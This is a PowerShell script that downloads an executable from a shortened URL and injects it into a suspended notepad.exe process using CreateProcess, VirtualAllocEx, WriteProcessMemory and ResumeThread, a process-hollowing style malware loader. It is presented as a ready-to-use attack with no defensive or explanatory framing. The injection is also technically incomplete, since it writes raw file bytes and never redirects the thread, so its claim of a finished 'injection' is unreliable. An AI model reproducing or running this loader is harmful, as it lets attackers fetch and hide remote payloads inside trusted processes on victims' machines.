# Set payload URL and download path
$payloadUrl = "https://tinyurl.com/5cexkpbw"  # <-- replace with your actual direct EXE link
$payloadPath = "$env:TEMP\payload.exe"

# Download the payload
Invoke-WebRequest -Uri $payloadUrl -OutFile $payloadPath -UseBasicParsing

# Read payload bytes
$payload = [System.IO.File]::ReadAllBytes($payloadPath)

# Add P/Invoke
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Hollow {
    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public int dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars;
        public int dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess, hThread;
        public int dwProcessId, dwThreadId;
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CreateProcess(
        string lpAppName, string lpCmdLine, IntPtr lpProcessAttrs, IntPtr lpThreadAttrs,
        bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] buffer, uint size, out UIntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    public static extern uint ResumeThread(IntPtr hThread);
}
"@

# Setup structures
$si = New-Object Hollow+STARTUPINFO
$si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($si)
$pi = New-Object Hollow+PROCESS_INFORMATION

# Create Notepad in suspended mode
$created = [Hollow]::CreateProcess("C:\Windows\System32\notepad.exe", $null, [IntPtr]::Zero, [IntPtr]::Zero, $false, 0x4, [IntPtr]::Zero, $null, [ref]$si, [ref]$pi)

if (-not $created) {
    Write-Error "[-] Failed to create process."
    exit
}

# Allocate memory in target
$base = [Hollow]::VirtualAllocEx($pi.hProcess, [IntPtr]::Zero, $payload.Length, 0x3000, 0x40)

# Write payload
$written = [UIntPtr]::Zero
[Hollow]::WriteProcessMemory($pi.hProcess, $base, $payload, $payload.Length, [ref]$written) | Out-Null

# Resume thread
[Hollow]::ResumeThread($pi.hThread) | Out-Null
Write-Host "[+] Injection complete."
